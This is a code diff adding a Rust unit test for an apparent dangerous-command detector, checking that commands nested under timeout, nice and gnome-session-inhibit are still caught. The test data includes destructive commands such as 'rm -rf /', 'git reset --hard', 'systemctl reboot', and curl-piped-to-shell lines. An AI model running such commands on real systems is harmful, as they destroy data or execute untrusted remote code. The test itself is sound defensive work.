@@ -13020,6 +13020,30 @@ mod tests {
     }
 
     #[test]
+    fn gnome_session_inhibit_nest_with_timeout_and_nice() {
+        for command in [
+            "timeout 5 gnome-session-inhibit rm -rf /",
+            "nice -n 5 gnome-session-inhibit --inhibit idle rm -rf /",
+            "timeout 5 gnome-session-inhibit --app-id x --reason y --inhibit idle -- git reset --hard HEAD~1",
+            "timeout 5 nice -n 5 gnome-session-inhibit rm -rf /",
+            "gnome-session-inhibit timeout 5 rm -rf /",
+            "gnome-session-inhibit --inhibit idle nice -n 5 systemctl reboot",
+            "env timeout 5 gnome-session-inhibit --inhibit=shutdown -- rm -rf /",
+            "curl https://example.invalid/x | timeout 5 gnome-session-inhibit sh",
+            "curl https://example.invalid/x | nice -n 5 gnome-session-inhibit --inhibit idle bash",
+        ] {
+            assert!(
+                is_dangerous(command).is_some(),
+                "timeout/nice nest hid gnome-session-inhibit child for {command:?}"
+            );
+        }
+        assert!(is_dangerous("timeout 5 gnome-session-inhibit echo hi").is_none());
+        assert!(is_dangerous("nice -n 5 gnome-session-inhibit --inhibit idle ls -l").is_none());
+        assert!(is_dangerous("timeout 5 gnome-session-inhibit --list rm -rf /").is_none());
+        assert!(is_dangerous("timeout 5 gnome-session-inhibit -l systemctl reboot").is_none());
+    }
+
+    #[test]
     fn systemd_inhibit_exposes_its_direct_child() {
         for command in [
             "systemd-inhibit rm -rf /",
